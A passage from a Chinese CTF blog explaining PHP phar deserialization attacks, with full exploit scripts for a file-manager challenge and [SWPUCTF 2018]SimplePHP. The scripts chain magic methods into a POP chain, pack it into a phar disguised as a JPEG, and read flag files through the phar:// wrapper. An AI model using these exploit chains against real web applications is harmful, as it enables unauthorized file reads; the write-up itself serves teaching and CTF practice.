            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">下载&lt;/a> / &lt;a href="#" class="delete">删除&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>
            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>代码核心就在<code>class.php</code>了</p>
<p>先看到login和register两个文件，用了PDO，注入相当困难，找到到文件下载功能<code>download</code>，可以看到这样的一句代码：<code>ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></p>
<p><strong>ini_set</strong>：出为一个配置选项设置值，可以设置php的一些配置，其中就包括<strong>open_basedir</strong>，用来限制当前程序可以访问的目录。当前设置为<code>getcwd()</code>当前目录和<code>/etc</code>和<code>/tmp</code>三个目录，这就是为什么前面下载不了根目录下的<code>flag</code>了</p>
<p>再看到<code>delete.php</code>文件，并没有限制，于是我们寻找可利用条件，重点看到<code>class.php</code>，在这个文件的<code>File</code>类中发现了<code>close()</code>方法中有一个<code>file_get_contents</code>方法，明显的文件读取，再找到使用了这个函数的方法，不难发现在<code>User</code>类中的<code>__destruct</code>方法调用了这个函数，<code>__destruct</code>方法是当一个对象被销毁的时候才调用，delete.php中就可以触发这方法，但是这也要这些类中的属性我们可控才能调用这些方法，于是这里就引出了<code>phar</code>伪协议反序列化的操作，详见上面的说明</p>
<p>于是初步构造payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>但是在<code>file_get_contents</code>后我们并没有回显的函数，于是就需要用到<code>FileList</code>类中的<code>__destruct</code>方法来回显，这里就需要再创建一个<code>FileList</code>类，令其中的<code>files</code>为<code>new File()</code>，但是这里就创建了两个类了，无法达到反序列化的效果，那么我们再来看看如何把这三个类给联系起来，可以看到<code>FileList</code>类中的<code>__call</code>方法，（ 当对象调用一个不存在的方法的时候调用，<strong>$func</strong>：被调用的方法名，<strong>$args</strong> ： 被调用方法中的参数，这是个数组），再看到上面的<code>User的</code>的<code>__destruct</code>方法，如果我们令<code>User</code>类中的<code>db</code>属性为<code>FileList</code>类，调用其中不存在的<code>close</code>方法，就可以完美触发<code>FileList</code>类中的<code>__call</code>方法，再看到<code>__call</code>方法的实现：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p><strong>array_push</strong>：将一个或多个单元压入数组的末尾（入栈）</p>
<p><strong>foreach</strong>：遍历数组</p>
<p>看到其中的<code>$file-&gt;$func();</code>，如果<code>$func</code>为<code>close</code>，就可以成功调用<code>File</code>类中的<code>close</code>方法，于是构造完整payload：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$o</span> <span class="token operator">-></span> <span class="token property">db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为 phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置 stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的 meta-data 存入 manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">rename</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'phar.phar'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phar.jpg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>将生成的<code>phar.jpg</code>上传，再在<code>delete</code>操作时抓包改包，如下，即可成功得到<code>flag</code>，话说为什么是<code>flag.txt</code>我也不知道，一般不是直接<code>flag</code>吗？-.-</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504221851430.png" alt loading="lazy"></p>
<h4 id="SWPUCTF-2018-SimplePHP"><a href="#SWPUCTF-2018-SimplePHP" class="headerlink" title="[SWPUCTF 2018]SimplePHP"></a>[SWPUCTF 2018]SimplePHP</h4><p>直接看关键代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p><code>_show</code>方法并未过滤phar，题目存在文件上传点和文件包含点，显然想到phar协议的利用</p>
<p>这题主要需要分析的是pop链，分析以上代码可以知道phar的利用点在<code>file_get_contents</code>函数，而触发<code>file_get_contents</code>函数需要从<code>__get-&gt;get-&gt;file_get-&gt;file_get_contents</code>，简单来讲就是要触发Test类中的<code>__get</code>方法，而<code>__get</code>方法的触发条件是需要对象读取不可访问属性的值，再看到Show类中的<code>__toString</code>方法</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>如果令<code>$this-&gt;str[&#39;str&#39;] = new Test()</code>那么不就可以触发Test类中的<code>__get</code>方法了吗</p>
<p>再想到<code>__toString</code>方法的触发方法，当一个类或对象被当作一个字符串被调用，在C1e4r类中刚好可利用</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>如果令 <code>$this-&gt;str = new Show()</code>即可触发</p>
<p>于是完整pop链如下：</p>
<p><code>C1e4r::__destruct -&gt; Show::__toSting -&gt; Test::__get</code></p>
<p>注意，这里<code>__get</code>方法中的<code>$key</code>的值为触发该方法时传入的不可访问属性的值，</p>
<p>简而言之就是如果<code>$this-&gt;str[&#39;str&#39;]-&gt;abc   =====&gt;   __get(abc)</code>，而题目中的是固定好的<code>socure</code>，</p>
<p>所以只需要<code>params[&#39;source&#39;] = &quot;/var/www/html/f1ag.php&quot;</code>即可</p>
<p>exp如下</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/f1ag.php"</span><span class="token punctuation">;</span>

<span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为 phar</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置 stub</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的 meta-data 存入 manifest</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"poc.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"poc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
<span class="token comment">//签名自动计算</span>
<span class="token variable">$phar</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>随后改后缀为jpg再上传，然后找到该文件，利用文件包含读取即可get flag</p>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP无参数RCE</title>
    <url>/posts/4f9c9406/</url>
    <content><![CDATA[<p>膜膜膜膜膜膜（这东西真的是奇淫技巧）</p>
